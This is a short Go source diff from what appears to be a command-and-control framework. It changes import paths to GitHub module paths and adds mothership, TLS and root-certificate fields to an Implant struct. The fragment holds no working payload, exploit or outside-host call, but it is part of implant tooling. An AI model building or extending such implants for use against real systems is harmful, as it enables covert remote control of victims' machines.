@@ -12,10 +12,10 @@ import (
   "runtime"
   "io/ioutil"
 
-  "odin/lib/c2"
-  "odin/lib/utils"
-  "odin/lib/penguins/zoo"
-  "odin/wheagle/server/grpcapi"
+  "github.com/alphamystic/odin/lib/c2"
+  "github.com/alphamystic/odin/lib/utils"
+  "github.com/alphamystic/odin/lib/penguins/zoo"
+  "github.com/alphamystic/odin/wheagle/server/grpcapi"
   "google.golang.org/grpc"
 )
 
@@ -53,13 +53,16 @@ func (iw *ImplantClientWrapper) Close() error{
   return iw.Conn.Close()
 }
 
-
 //var IsAlive bool
 type Implant struct{
   Address string
+  MothershipID string
+  MotherShips []string
   TunnelAddress string
   ISession *c2.Session
   OS string
+  Tls bool
+  RootPem []byte
 }
 
 func (i *Implant) RunGRPCImplant(){
